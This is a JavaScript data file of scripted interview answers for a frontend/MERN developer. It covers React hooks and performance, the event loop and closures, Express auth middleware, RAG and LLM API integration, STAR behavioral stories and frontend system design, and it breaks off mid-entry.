// Each answer is an array of { label, text } — label is bold, text is what you say to the recruiter.
// Read each point one by one — it's a complete verbal script.

export const interviewCategories = [
  {
    id: 'react',
    label: '⚛️ React',
    description: 'Hooks, Architecture, State — Basic to Advanced',
    questions: [
      {
        level: 'Basic',
        q: "What is React and how is it different from a framework like Angular?",
        structure: "Library → Component-based → Virtual DOM → declarative",
        points: [
          { label: "One-liner", text: "React is a JavaScript library from Meta for building user interfaces — it focuses only on the View layer, not the full application." },
          { label: "Library vs Framework", text: "Angular is a full framework that gives you everything — routing, forms, HTTP. React is just the UI layer, which means I choose my own tools for routing (Next.js, React Router) and state management (RTK, Zustand)." },
          { label: "Component Model", text: "The core idea is that your entire UI is broken into small, reusable components — each managing its own state and rendering its own HTML." },
          { label: "Virtual DOM", text: "Instead of touching the real DOM (which is slow), React keeps a lightweight JS copy called the Virtual DOM. When state changes, it diffs the old and new virtual DOM and only updates the exact parts that changed." },
          { label: "Declarative style", text: "I describe what the UI should look like — not the steps to get there. React handles the DOM operations automatically, which eliminates an entire class of bugs." }
        ]
      },
      {
        level: 'Basic',
        q: "What is the difference between State and Props?",
        structure: "Internal vs external → mutable vs immutable → when each changes = re-render",
        points: [
          { label: "Props", text: "Props are data a parent component passes down to a child. They are read-only — the child cannot and should not modify them." },
          { label: "State", text: "State is data that a component owns and controls itself. It's mutable — changing it with setState or a useState setter triggers a re-render." },
          { label: "Simple Rule", text: "If the data comes from outside your component, it's a prop. If the data lives inside and the component controls it, it's state." },
          { label: "Re-render trigger", text: "Both cause re-renders when they change. Props change triggers re-render only if the parent re-renders and passes new values. State change always triggers a re-render of that component and its children." },
          { label: "Real Example", text: "In a JobCard component — the job title and company come in as props from a parent list. The 'isExpanded' toggle (showing/hiding details) would be local state because only that card cares about it." }
        ]
      },
      {
        level: 'Basic',
        q: "What are React Hooks and why were they introduced?",
        structure: "Class problem → useState/useEffect → Rules of Hooks",
        points: [
          { label: "The Problem", text: "Before Hooks, state and lifecycle methods only worked in class components — but classes had a steep learning curve, confusing 'this' bindings, and logic spread across lifecycle methods was hard to reuse." },
          { label: "What Hooks Are", text: "Hooks are functions that let you use React features — state, effects, context — inside functional components. useState, useEffect, useContext, useRef, useMemo, useCallback." },
          { label: "useState", text: "useState lets a functional component hold and update state. It returns a tuple of [currentValue, setterFunction]." },
          { label: "useEffect", text: "useEffect replaces componentDidMount, componentDidUpdate, and componentWillUnmount. You run side effects — fetching data, subscriptions, timers — and clean up by returning a function." },
          { label: "Rules of Hooks", text: "Two rules: 1) Only call Hooks at the top level — not inside loops, conditions, or nested functions. 2) Only call Hooks from React functions — not plain JS. These rules ensure the Hook call order stays consistent between renders." }
        ]
      },
      {
        level: 'Intermediate',
        q: "How does React's Reconciliation and Virtual DOM diffing algorithm work?",
        structure: "Render → new VDOM → diff (Reconciliation) → commit to real DOM",
        points: [
          { label: "Starting point", text: "Every time state or props change, React's render phase runs and creates a new Virtual DOM tree — a lightweight JS object representing what the UI should look like." },
          { label: "Diffing Step 1 — Type check", text: "React first checks the element type. If the type changed — say from a div to a span — React destroys the old subtree entirely and builds a fresh one. Short-circuits the comparison." },
          { label: "Diffing Step 2 — Props", text: "If the type is the same, React compares the props and only updates what changed — so if only the 'color' prop changed, only that attribute is touched in the real DOM." },
          { label: "List diffing and keys", text: "For lists, React uses the 'key' prop to match old and new items. Without keys, React re-renders entire lists when items are added or reordered. Keys allow it to move, reuse, and only update the changed item." },
          { label: "Commit Phase", text: "After diffing, React batches all the changes and applies them to the real DOM in one go — minimizing expensive browser reflows and repaints." },
          { label: "Fiber", text: "React Fiber (v16+) made this algorithm async and interruptible — so high-priority updates like user interactions can pause low-priority background rendering." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the difference between useMemo and useCallback?",
        structure: "useMemo caches values → useCallback caches functions → both for performance",
        points: [
          { label: "Core difference", text: "useMemo caches the result of a computation — the value. useCallback caches the function definition itself — not its return value." },
          { label: "useMemo", text: "Use it when you have an expensive calculation — like filtering a 10,000-item array — and you don't want it to re-run on every render. It re-runs only when its dependencies change." },
          { label: "useCallback", text: "Use it when you're passing a function as a prop to a child component wrapped in React.memo. Without useCallback, a new function reference is created on every parent render, breaking the memo." },
          { label: "The Referential Equality problem", text: "In JavaScript, every new render creates a new function object even if the logic is identical. React.memo does a shallow comparison — different reference = re-render. useCallback fixes this." },
          { label: "When NOT to use them", text: "Don't sprinkle these everywhere. They add overhead — memory for the cache and the comparison. Only memoize when profiling shows a real performance problem." }
        ]
      },
      {
        level: 'Intermediate',
        q: "How do you manage complex state — when would you use useReducer vs useState?",
        structure: "useState for simple → useReducer when logic is complex or state is interconnected",
        points: [
          { label: "useState is great for", text: "Simple, independent scalar values — a loading boolean, a search string, a counter. Easy to read, easy to reason about." },
          { label: "When useState breaks down", text: "When you have multiple related pieces of state that must change together, or when the next state depends on complex logic of the previous state — multiple setters get messy and out of sync." },
          { label: "useReducer pattern", text: "useReducer gives you a Redux-style pattern — a dispatch function and a pure reducer function. You dispatch an action like { type: 'SUBMIT_FORM', payload: data }, and the reducer computes the new state deterministically." },
          { label: "Testability", text: "Reducers are pure functions — they take state + action and return new state. Zero side effects. This makes them trivially easy to unit test without mounting any component." },
          { label: "Real Example", text: "A multi-step job application form — step index, form data for each step, validation errors, submission status — all belong together in a reducer because they're deeply interdependent." }
        ]
      },
      {
        level: 'Advanced',
        q: "Explain React Concurrent Mode — what problems does it solve?",
        structure: "Blocking renders → interruptible → startTransition → useTransition",
        points: [
          { label: "The Problem", text: "Before Concurrent Mode, React rendering was synchronous. If a heavy state update started, it would block the main thread until complete — the UI froze, user input was dropped, it felt unresponsive." },
          { label: "Concurrent Mode", text: "Concurrent Mode makes rendering interruptible. React can start rendering an update, pause it if something more urgent comes in — like a user keypress — handle that first, then resume." },
          { label: "startTransition", text: "You wrap non-urgent updates with startTransition(() => setState(newValue)). React knows this update can be paused or discarded if something higher priority comes in." },
          { label: "useTransition", text: "useTransition returns [isPending, startTransition]. The isPending flag lets you show a loading spinner in the UI while the low-priority update is still being computed in the background — no blocking." },
          { label: "Real Use Case", text: "A search input filtering a massive list — the typing (high priority) stays instant and smooth while the list filtering (low priority) happens concurrently. Without this, typing would stutter." }
        ]
      },
      {
        level: 'Situation-Based',
        q: "Your app re-renders are causing lag. How do you diagnose and fix it?",
        structure: "Profile → find cause → fix with memo/colocation/splitting",
        points: [
          { label: "Step 1 — Profile First", text: "Open React DevTools Profiler. Record an interaction. Look for components with long render times or components that re-rendered when they shouldn't have." },
          { label: "Step 2 — State Colocation", text: "If state lives too high in the tree, every state change re-renders the whole subtree. Move state down to the smallest component that actually needs it." },
          { label: "Step 3 — React.memo", text: "Wrap expensive child components in React.memo so they only re-render if their props actually changed — not every time the parent renders." },
          { label: "Step 4 — Stable References", text: "Props must have stable references. useCallback for functions, useMemo for objects/arrays passed as props. Otherwise React.memo is useless — new reference = re-render." },
          { label: "Step 5 — Context splitting", text: "A single large Context re-renders ALL consumers on any change. Split it — AuthContext, ThemeContext, DataContext — so components only subscribe to what they need." },
          { label: "Step 6 — Virtualization", text: "If it's a long list causing lag, don't render thousands of DOM elements. Use react-window or react-virtual to only render what's visible in the viewport." }
        ]
      },
      {
        level: 'Decision-Based',
        q: "When would you choose Redux Toolkit over Context API?",
        structure: "Context re-render problem → RTK selectors → DevTools → middleware",
        points: [
          { label: "Context API is great for", text: "Slowly changing global data — auth state, theme, language preference. Simple, built-in, no dependencies." },
          { label: "Context API problem", text: "Every time ANY value in a Context changes, ALL components consuming that context re-render — even if they only use one field. In a large app, this becomes a performance problem." },
          { label: "Redux Toolkit advantage 1 — Selectors", text: "RTK with useSelector let components subscribe to just the piece of state they care about. If only the username changes, only the username-displaying component re-renders." },
          { label: "Redux Toolkit advantage 2 — DevTools", text: "Redux DevTools let you time-travel through state changes, inspect every action, and replay events. Invaluable for debugging complex workflows." },
          { label: "Redux Toolkit advantage 3 — Middleware", text: "Redux middleware like RTK Query handles API caching, request deduplication, and automatic re-fetching out of the box. Context has none of this." },
          { label: "My Rule", text: "Context for UI state (theme, auth). RTK for domain state shared across many unrelated features, or when you need caching, DevTools, or middleware." }
        ]
      }
    ]
  },
  {
    id: 'js',
    label: '🟨 JavaScript',
    description: 'Event Loop, Closures, Async — Basic to Advanced',
    questions: [
      {
        level: 'Basic',
        q: "What is the difference between var, let, and const?",
        structure: "Scope → hoisting → TDZ → reassignment",
        points: [
          { label: "var", text: "var is function-scoped — it leaks out of if-blocks and for-loops. It's hoisted to the top of its function and initialized as undefined, so you can use it before its declaration without an error — just gets undefined." },
          { label: "let", text: "let is block-scoped — confined to the { } block it's declared in. It's also hoisted but NOT initialized, so accessing it before the declaration throws a ReferenceError." },
          { label: "const", text: "const is also block-scoped like let, but it prevents reassignment — you can't do 'const x = 1; x = 2'. However, for objects and arrays, the contents can still mutate — const only locks the reference, not the value." },
          { label: "Temporal Dead Zone", text: "The TDZ is the gap between when a let/const block is entered and when the variable is initialized. Accessing a let or const variable in that zone throws a ReferenceError. var doesn't have this — it defaults to undefined." },
          { label: "Best Practice", text: "Always use const by default. Use let only when you need to reassign. Never use var in modern code — its function-scoping and hoisting behavior causes too many bugs." }
        ]
      },
      {
        level: 'Intermediate',
        q: "Explain the JavaScript Event Loop in detail.",
        structure: "Single thread → Call Stack → Web APIs → Microtask Queue → Macrotask Queue",
        points: [
          { label: "Single Thread", text: "JavaScript runs on a single thread — only one thing executes at a time. The Call Stack handles synchronous code, executing functions one by one." },
          { label: "Async Hand-off", text: "When an async operation runs — setTimeout, fetch, setInterval — it's handed off to the browser's Web APIs. The JS engine doesn't wait. It continues executing the next synchronous code." },
          { label: "Queues", text: "When asynchronous work finishes, callbacks go into queues. There are two: the Microtask Queue (used by Promises, queueMicrotask) and the Macrotask Queue (used by setTimeout, setInterval, I/O)." },
          { label: "The Event Loop Rule", text: "After every single task from the Macrotask queue runs, the Event Loop drains the ENTIRE Microtask queue before picking the next macrotask. Microtasks always get priority." },
          { label: "Practical Example", text: "console.log('1') runs. Then Promise.resolve().then(() => console.log('2')) — queues to microtask. Then setTimeout(() => console.log('3'), 0) — queues to macrotask. Output: 1, 2, 3. The promise runs before the timeout even though both are async." },
          { label: "Why this matters", text: "If you have a heavy synchronous computation inside a setTimeout callback, it blocks the call stack and freezes the UI — even though it's 'async'. True async means breaking work into small chunks." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is a Closure? Explain with a real-world example.",
        structure: "Lexical scope → outer function returns → inner function retains access",
        points: [
          { label: "Definition", text: "A closure is when a function retains access to variables from its outer (enclosing) lexical scope even after the outer function has finished executing and returned." },
          { label: "Why it works", text: "JavaScript uses lexical scoping — a function's scope is determined by where it's written in the code, not where it's called from. The inner function keeps a reference to the outer function's variable environment." },
          { label: "Classic Example — Counter", text: "function makeCounter() { let count = 0; return () => ++count; } — The returned arrow function closes over 'count'. Every call to counter() increments the same count variable. From outside, count is completely private." },
          { label: "Real-world — Debounce", text: "In a debounce function, the outer function holds a timerId variable. The returned inner function closes over timerId — it can read and mutate it on every call to clear the previous timer. Without closure, timerId would disappear when the outer function returned." },
          { label: "React relevance", text: "Closures cause a common React bug — stale closures. If a useEffect closes over a state value but has an empty dependency array, it captures the state value at mount time and never sees updates. This is why ESLint warns about missing dependencies." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the difference between Promise.all, Promise.allSettled, and Promise.race?",
        structure: "Short-circuit vs wait-for-all vs first-wins",
        points: [
          { label: "Promise.all", text: "Runs all promises concurrently. Resolves with an array of all results when every promise resolves. But — if ANY single promise rejects, it immediately rejects and discards the other results. Use when all results are required." },
          { label: "Promise.allSettled", text: "Also runs concurrently, but ALWAYS waits for every promise to settle — whether fulfilled or rejected. Returns an array of { status: 'fulfilled', value } or { status: 'rejected', reason } objects. Use when you need to handle each independently." },
          { label: "Promise.race", text: "Returns the result — resolve or reject — of whichever promise settles first. The others keep running but their results are ignored. Use for timeout patterns: race a fetch against a timeout promise." },
          { label: "Promise.any", text: "Returns the first resolved value. Rejects only if ALL promises reject. Different from Promise.race which resolves/rejects on the first settlement regardless — .any ignores rejections until they all reject." },
          { label: "My rule", text: "I use .all for parallel APIs where I need all results. .allSettled when I want to handle each result independently without short-circuiting. .race for implementing request timeouts." }
        ]
      },
      {
        level: 'Advanced',
        q: "How does 'this' work in JavaScript? Explain all 4 binding rules.",
        structure: "4 rules: Default → Implicit → Explicit → new → Arrow exception",
        points: [
          { label: "Key Concept", text: "The value of 'this' is NOT determined by where a function is written — it's determined by how the function is called. Arrow functions are the exception." },
          { label: "Rule 1 — Default binding", text: "If a function is called standalone — just func() — 'this' is the global object (window in browser) or undefined in strict mode." },
          { label: "Rule 2 — Implicit binding", text: "If a function is called as a method — obj.func() — 'this' is the object to the left of the dot: obj. This is how most OOP patterns work." },
          { label: "Rule 3 — Explicit binding", text: ".call(thisArg, arg1), .apply(thisArg, [args]), .bind(thisArg) — you manually specify what 'this' should be. .bind returns a new permanently bound function." },
          { label: "Rule 4 — new binding", text: "When called with 'new', JavaScript creates a brand new object, sets 'this' to that object, runs the constructor, and returns the object. This is how classes work under the hood." },
          { label: "Arrow functions — the exception", text: "Arrow functions don't have their own 'this'. They inherit 'this' lexically from the surrounding code when they were written. This is why arrow functions are used for event handlers inside React classes and why you can use 'this' inside setTimeout callbacks in arrow form." }
        ]
      },
      {
        level: 'Situation-Based',
        q: "You need to make 10 API calls in parallel and handle each success/failure independently. How?",
        structure: "Promise.allSettled → map results → handle each outcome",
        points: [
          { label: "Wrong approach", text: "Using Promise.all would short-circuit on the first failure — if API call #3 fails, you lose results from calls #4–10 that may have succeeded." },
          { label: "Right approach", text: "Use Promise.allSettled — it runs all 10 concurrently and waits for every single one to settle, regardless of success or failure." },
          { label: "Code structure", text: "const results = await Promise.allSettled(apiCalls.map(call => fetch(call))); — this gives you an array of 10 result objects." },
          { label: "Processing results", text: "const succeeded = results.filter(r => r.status === 'fulfilled').map(r => r.value); const failed = results.filter(r => r.status === 'rejected').map(r => r.reason);" },
          { label: "Follow-up", text: "For failed ones, I'd log them to an error monitoring service, show a partial success message in the UI, and potentially queue a retry with exponential backoff for transient failures." }
        ]
      }
    ]
  },
  {
    id: 'mern',
    label: '🌿 MERN Stack',
    description: 'MongoDB, Express, Node.js — Integration and production patterns',
    questions: [
      {
        level: 'Basic',
        q: "How does authentication work in a MERN app? Walk me through the full flow.",
        structure: "User logs in → backend verifies → JWT created → stored in HttpOnly cookie → sent with every request",
        points: [
          { label: "Step 1 — User submits credentials", text: "Frontend sends a POST request with email and password to /api/auth/login." },
          { label: "Step 2 — Backend verifies", text: "Express finds the user in MongoDB by email. It uses bcrypt.compare() to verify the password hash — we never store plaintext passwords." },
          { label: "Step 3 — JWT creation", text: "If credentials are valid, the backend creates a JWT using jwt.sign({ userId, role }, secret, { expiresIn: '15m' }). The payload contains only non-sensitive identifiers." },
          { label: "Step 4 — Secure storage", text: "The JWT is sent back in an HttpOnly cookie — NOT in the response body to be stored in localStorage. HttpOnly means JavaScript can't read it, which protects against XSS attacks." },
          { label: "Step 5 — Every subsequent request", text: "The browser automatically sends the cookie with every request. The backend has an auth middleware that verifies the JWT signature and attaches the decoded userId to req.user." },
          { label: "Refresh token pattern", text: "Access tokens expire quickly (15 minutes). A refresh token (7 days) is stored in a separate HttpOnly cookie. When the access token expires, a silent background call to /api/auth/refresh gets a new access token." }
        ]
      },
      {
        level: 'Intermediate',
        q: "How does Express middleware work? Explain with a custom auth middleware example.",
        structure: "req → middleware chain → next() → route handler",
        points: [
          { label: "Middleware definition", text: "Middleware is a function with the signature (req, res, next). Express processes requests through a chain of these functions in the order they're registered with app.use()." },
          { label: "The next() function", text: "Calling next() passes control to the next middleware in the chain. Not calling it means the request hangs — the client never gets a response. Calling next(error) jumps to error-handling middleware." },
          { label: "Auth middleware example", text: "const protect = (req, res, next) => { const token = req.cookies.jwt; if (!token) return res.status(401).json({ error: 'Not authenticated' }); try { req.user = jwt.verify(token, SECRET); next(); } catch { res.status(401).json({ error: 'Token expired' }); } };" },
          { label: "Using it", text: "router.get('/profile', protect, profileController) — the protect middleware runs first. If it fails, the controller never executes. If it passes, req.user is available in the controller." },
          { label: "Order matters", text: "Middleware runs in the exact order app.use() is called. Logger middleware should come before routes. CORS middleware must come before any route handlers. Error middleware (4 args: err, req, res, next) must come last." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is the N+1 query problem in MongoDB? How do you avoid it with Mongoose?",
        structure: "Loop → 1 query per item → .populate() → aggregation $lookup",
        points: [
          { label: "The Problem", text: "You fetch a list of 100 blog posts — that's 1 query. Then in a loop, you fetch the author for each post — that's 100 more queries. Total: 101 queries for what should be a simple 2-query operation." },
          { label: "Why it's bad", text: "Each query has network latency overhead, even against a local database. 100 queries at 5ms each = 500ms delay. As data grows, this scales catastrophically." },
          { label: "Fix 1 — .populate()", text: "Mongoose's .populate('author') replaces the author field (which stores just an ID) with the full user document. It makes exactly 2 database calls total — one for posts, one for all referenced authors." },
          { label: "Fix 2 — Aggregation $lookup", text: "For complex joins, use MongoDB's aggregation pipeline with $lookup for server-side joins. This is faster because the join happens inside MongoDB — no multiple round trips." },
          { label: "Fix 3 — Projection", text: "Never fetch more data than you need. .select('title author created_at -body') excludes the large 'body' field from posts in a list view. This reduces memory and network transfer significantly." }
        ]
      },
      {
        level: 'Advanced',
        q: "How do you scale a Node.js API handling heavy traffic?",
        structure: "Profile → indexes → cache → cluster → queue",
        points: [
          { label: "Step 1 — Profile First", text: "Use Clinic.js or the built-in Node profiler to find if the bottleneck is CPU-bound (blocking computation) or I/O-bound (slow database). The solution is different for each." },
          { label: "Step 2 — Database Indexes", text: "Run .explain('executionStats') on slow MongoDB queries. If docsExamined >> nReturned, you're doing a full collection scan — add a compound index on your most-queried fields. This is often the biggest win." },
          { label: "Step 3 — Caching with Redis", text: "For frequently read, rarely changed data — user profiles, component counts, config — cache in Redis with a TTL. A cache hit takes microseconds vs milliseconds for a DB query." },
          { label: "Step 4 — Node Clustering", text: "Node is single-threaded but your server has 8 CPU cores sitting idle. Use Node's Cluster module or PM2 with cluster mode to spawn one process per CPU core, multiplying throughput by 8x." },
          { label: "Step 5 — Job Queues for heavy work", text: "Don't do email sending, PDF generation, or image processing inside an API request. Offload to a background queue — Bull + Redis — return a 202 Accepted immediately, process asynchronously." },
          { label: "Step 6 — Connection pooling", text: "Mongoose maintains a pool of MongoDB connections (default 5). Under heavy load, increase the pool size: mongoose.connect(uri, { maxPoolSize: 20 }). This prevents connection bottlenecks." }
        ]
      },
      {
        level: 'Decision-Based',
        q: "When would you choose REST vs GraphQL for a MERN app?",
        structure: "REST → simple CRUD → GraphQL → complex querying/multiple clients",
        points: [
          { label: "REST is great for", text: "Well-defined CRUD resources where the data shape is fixed and predictable. Standard tooling (Postman, browser caching, CDN caching for GET requests), easy to document with Swagger, team familiarity." },
          { label: "REST problem — Over/Under fetching", text: "A mobile app might only need the user's name and avatar, but a REST endpoint returns the entire user object. GraphQL solves this — clients request exactly the fields they need, nothing more." },
          { label: "GraphQL is great for", text: "When multiple different clients (mobile, web, embedded) consume the same API but need different data shapes. Or when a single page needs to aggregate data from multiple resource types in one request." },
          { label: "GraphQL trade-offs", text: "More complex setup, N+1 query problems are even worse (need DataLoader to batch), caching is harder (all requests are POST to one endpoint), and it's overkill for simple CRUD apps." },
          { label: "My default", text: "I start with REST — it's simpler, well-understood, and handles 90% of use cases well. I'd consider GraphQL only if we have multiple client types with very different data needs, or a heavily interconnected data model." }
        ]
      }
    ]
  },
  {
    id: 'ai_llm',
    label: '🤖 AI & LLM Tools',
    description: 'Prompt engineering, APIs, RAG — for frontend developers',
    questions: [
      {
        level: 'Basic',
        q: "What is an LLM and how does it work at a basic level?",
        structure: "Training → Transformer → Token prediction → not memory-based",
        points: [
          { label: "What it is", text: "LLM stands for Large Language Model. It's a neural network trained on massive amounts of text data to understand and generate human-like language." },
          { label: "How it's trained", text: "During training, the model sees billions of text examples and learns to predict the next token (word piece) given what came before. Through billions of these predictions with corrections, it learns grammar, facts, reasoning patterns." },
          { label: "Transformer architecture", text: "LLMs use the Transformer architecture with a mechanism called 'attention' — which allows the model to relate any word in a sentence to any other word, regardless of distance. This is what makes it understand context." },
          { label: "What it's NOT", text: "LLMs don't 'think' or 'know' things the way humans do. They generate statistically likely next tokens based on patterns learned during training. They can confidently produce wrong answers — hallucinations." },
          { label: "Key models", text: "GPT-4o (OpenAI), Gemini 1.5 Pro (Google), Claude 3.5 Sonnet (Anthropic), Llama 3 (Meta, open-source). As a developer, I interact with these via their HTTP APIs." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is prompt engineering? Give examples of techniques you use.",
        structure: "Input design → output quality → zero-shot → few-shot → chain-of-thought",
        points: [
          { label: "Definition", text: "Prompt engineering is the practice of carefully designing the text input to an LLM to reliably get the desired output format, quality, and accuracy." },
          { label: "Technique 1 — Role Prompting", text: "Tell the model who it is: 'You are a senior React developer with 10 years of experience at Facebook. Answer concisely.' This changes tone, depth, and vocabulary of responses." },
          { label: "Technique 2 — Few-shot examples", text: "Give the model 2-3 examples of input→output pairs you want. The model pattern-matches. Much more reliable than just describing what you want." },
          { label: "Technique 3 — Chain of Thought", text: "Add 'Think step by step' to complex questions. The model reasons through sub-problems before giving a final answer, dramatically improving accuracy on multi-step problems." },
          { label: "Technique 4 — Output format specification", text: "Tell the model exactly what format you want: 'Return a valid JSON array with these fields: name, score, reason. No markdown.' This makes the output reliably parseable by code." },
          { label: "Why developers care", text: "A poorly prompted function calling GPT-4 can cost 10x more tokens than a well-prompted one doing the same task. Prompt engineering directly affects cost, latency, and reliability." }
        ]
      },
      {
        level: 'Intermediate',
        q: "What is RAG (Retrieval-Augmented Generation) and when would you use it?",
        structure: "LLM knowledge cutoff → embed documents → vector search → inject context",
        points: [
          { label: "The Problem RAG Solves", text: "LLMs have a training cutoff date and don't know about your private data — internal docs, your codebase, company policies, real-time info. You can't retrain for every update." },
          { label: "RAG Architecture — Step 1", text: "Take your documents (PDFs, docs, web pages), split them into chunks, and convert each chunk to an embedding — a numerical vector representing its semantic meaning — using a model like text-embedding-3-small." },
          { label: "Step 2 — Store in vector DB", text: "Store embeddings in a vector database like Pinecone, Chroma, or pgvector. Vector databases can find the most semantically similar chunks to a query in milliseconds." },
          { label: "Step 3 — Query time", text: "When a user asks a question, convert the question to an embedding too. Do a similarity search in the vector DB to retrieve the top 5 most relevant document chunks." },
          { label: "Step 4 — Inject and generate", text: "Inject those retrieved chunks as context into the LLM prompt: 'Based on the following company documentation: [chunks]. Answer the question: [user question]'. The LLM answers using your private data." },
          { label: "Advantage over fine-tuning", text: "RAG is cheaper, faster to update — just add new docs — and the sources are traceable (you can cite which chunk the answer came from). Fine-tuning bakes knowledge permanently into model weights, which is harder to update." }
        ]
      },
      {
        level: 'Situation-Based',
        q: "How would you integrate a Gemini or GPT API into a React + Node app securely?",
        structure: "Never expose key client-side → backend route → streaming → error handling",
        points: [
          { label: "Golden Rule", text: "NEVER call the LLM API directly from React/browser code. The API key would be exposed in the client bundle — anyone can steal it and run up your bill." },
          { label: "Backend Route", text: "Create a secure Express endpoint: POST /api/ai/generate. This is the only place that imports and uses the API key from environment variables." },
          { label: "Frontend call", text: "React sends a POST to your own /api/ai/generate with the user's input. Your backend then calls the LLM API, keeps the key secret." },
          { label: "Rate limiting", text: "Add rate limiting middleware on /api/ai/generate — something like express-rate-limit: max 10 requests per minute per IP. Protect from abuse." },
          { label: "Streaming for UX", text: "For long responses, use streaming. The backend pipes the LLM stream directly to the response. In React, read the stream with ReadableStream and append chunks to state as they arrive — creates the 'typing' effect." },
          { label: "Error handling", text: "Wrap in try-catch. If the LLM is down, return a user-friendly error. Log actual errors server-side. Show a retry button in the UI. Don't expose raw API error messages to the client." }
        ]
      }
    ]
  },
  {
    id: 'behavioral',
    label: '🎯 Behavioral + HR',
    description: 'STAR stories — say exactly this to the recruiter',
    questions: [
      {
        level: 'HR',
        q: "Tell me about yourself.",
        structure: "Present → Past → Future — 2 minutes max",
        points: [
          { label: "Opening (Present)", text: "I'm a frontend developer specializing in React and Next.js, with hands-on experience building performant, data-driven web applications." },
          { label: "Past — Key accomplishment", text: "Most recently I worked at Avua.com, where I built core parts of their CV builder product — handling drag-and-drop interfaces, real-time state management, and integrating multiple APIs." },
          { label: "Skills highlight", text: "My strongest areas are React architecture, performance optimization, and building clean, maintainable component systems. I'm also comfortable going full-stack with Node.js and MongoDB when needed." },
          { label: "Why here", text: "I'm looking for a role where I can own meaningful frontend work and collaborate with a product team that cares about user experience. What drew me to this company specifically is [research the company — mention product, culture, tech stack]." },
          { label: "Close", text: "I'm ready to contribute from day one, and I'm excited about the opportunity to discuss how I can help your team." }
        ]
      },
      {
        level: 'HR',
        q: "Why are you looking for a new opportunity?",
        structure: "Brief honest reason → pivot to growth → forward-focused",
        points: [
          { label: "Keep it brief", text: "I've completed a significant chapter of my learning at my last role and I'm ready for new challenges." },
          { label: "Growth angle", text: "I want to work on products at a larger scale, with more complex engineering problems — ideally in a team where I can both contribute to and learn from strong engineers." },
          { label: "Never say", text: "Never say: my manager was bad, the pay was terrible, the company was toxic. Even if true — it raises red flags about YOU, not them." },
          { label: "Pivot to them", text: "That's what makes this opportunity interesting to me — [specific thing about this company/role]. I can see how my skills directly align with what you're building." }
        ]
      },
      {
        level: 'STAR',
        q: "Tell me about a technical challenge you faced and how you solved it.",
        structure: "Situation → Task → YOUR specific actions → Quantified Result",
        points: [
          { label: "Situation", text: "At Avua, our CV builder drag-and-drop feature was causing the entire page to freeze for 2-3 seconds whenever a user reordered sections on a large CV." },
          { label: "Task", text: "My task was to diagnose the root cause and fix it without changing the feature's behavior or UX." },
          { label: "Action 1 — Diagnose", text: "I used React DevTools Profiler and found that every drag event was updating the shared position state, causing 400+ re-renders per second across the entire component tree." },
          { label: "Action 2 — Fix architecture", text: "I refactored the drag logic to track position in a ref (not state) during the drag — only committing the final reordered array to state on drop. This reduced re-renders to exactly 1 per drag operation." },
          { label: "Action 3 — Memoization", text: "I wrapped individual section cards in React.memo and stabilized all callback props with useCallback so unaffected sections wouldn't re-render at all." },
          { label: "Result", text: "The freezing was completely eliminated. The interaction went from 2-3 second stutter to buttery smooth. I also documented the pattern for the team and it became our standard for all drag-and-drop features going forward." }
        ]
      },
      {
        level: 'STAR',
        q: "Describe a time you disagreed with a decision and what you did.",
        structure: "Assertion → Evidence → Empathy → Resolution",
        points: [
          { label: "Situation", text: "The team wanted to use localStorage to cache all API responses for instant loading. I disagreed because sensitive user data would persist unencrypted in the browser." },
          { label: "My approach — Listen first", text: "Before pushing back, I asked the engineer to walk me through their thinking. I understood their goal — fast initial loads — was completely valid." },
          { label: "My approach — Come with data", text: "I prepared a short writeup comparing localStorage vs HTTP caching vs React Query's built-in caching. I showed that React Query with staleTime: 5 minutes solved the performance goal without the security risk." },
          { label: "Outcome", text: "After reviewing the comparison, the team agreed to use React Query. We got the fast loads they wanted and avoided a potential security audit issue months later." },
          { label: "What I learned", text: "Disagreements go better when you acknowledge the other person's goal is valid and present an alternative that achieves it — rather than just saying 'no, that's wrong'." }
        ]
      }
    ]
  },
  {
    id: 'system',
    label: '🏗️ System Design',
    description: 'Frontend architecture — how to answer these open-ended questions',
    questions: [
      {
        level: 'Intermediate',
        q: "Design a scalable Job Feed (like LinkedIn or Naukri).",
        structure: "Clarify → Architecture → Virtualization → Pagination → Real-time",
        points: [
          { label: "Clarify requirements first", text: "I'd ask: expected number of posts? Update frequency — real-time or every X minutes? Infinite scroll or pagination? Mobile support?" },
          { label: "Component architecture", text: "Feed container manages data fetching. JobCard component is the rendering unit — kept slim with all heavy logic abstracted. FeedSkeleton for loading states." },
          { label: "Virtualization", text: "A feed with 5,000 cards cannot render all DOM nodes at once — it crashes the browser. I'd use react-window to render only the ~10 visible cards at any time, with a buffer of 2 above and below." },
          { label: "Data fetching", text: "Cursor-based infinite scroll — not offset pagination. As the last visible card approaches the viewport (IntersectionObserver), fetch the next batch using the last post's ID as cursor. This is efficient even on millions of records." },
          { label: "State management", text: "React Query — it caches posts per cursor key, handles background refetching, and deduplicates simultaneous requests. No manual loading/error state management needed." },
          { label: "Real-time updates", text: "For new post notifications, use Server-Sent Events — lightweight, automatic reconnect, perfect for one-way server push. When a new post arrives, show a 'X new posts' button — don't auto-insert at top as it ruins scroll position." }
        ]
      },
      {
        level: 'Advanced',
        q: "Your app takes 8 seconds to load. How do you fix it?",
        structure: "Lighthouse → Bundle analysis → Code split → Images → CDN → Server",
        points: [
          { label: "Step 1 — Measure, don't guess", text: "Run a Lighthouse audit in Chrome DevTools on Incognito + throttled connection. Identify which Core Web Vital is failing — LCP, CLS, or INP — and focus there first." },
          { label: "Step 2 — Bundle analysis", text: "Run webpack-bundle-analyzer or source-map-explorer. Find large dependencies — moment.js, lodash, charting libraries — imported fully but only partially used. Tree-shake or replace with smaller alternatives." },
          { label: "Step 3 — Code splitting", text: "Lazy-load every route with React.lazy(() => import('./Page')). Users pay only for the JavaScript of the current page. A dashboard user doesn't need the settings page's code on first load." },
          { label: "Step 4 — Image optimization", text: "Images are usually the LCP culprit. Convert to WebP (40% smaller). Add proper width and height attributes to prevent CLS. Lazy-load below-fold images. Preload the hero image in the HTML head." },
          { label: "Step 5 — CDN and caching", text: "Move all static assets to a CDN — Cloudflare or CloudFront. Enable Brotli compression on the server. Set proper cache headers: static assets (1 year), HTML (no-cache), API responses (varies)." },
          { label: "Step 6 — Server response time", text: "If the HTML document itself is slow, the problem is server-side. Add Redis caching to expensive queries. Consider SSG or ISR for mostly-static pages in Next.js — serve pre-built HTML from CDN." }
        ]
      }
    ]
  },
  {
    id: 'my_story',
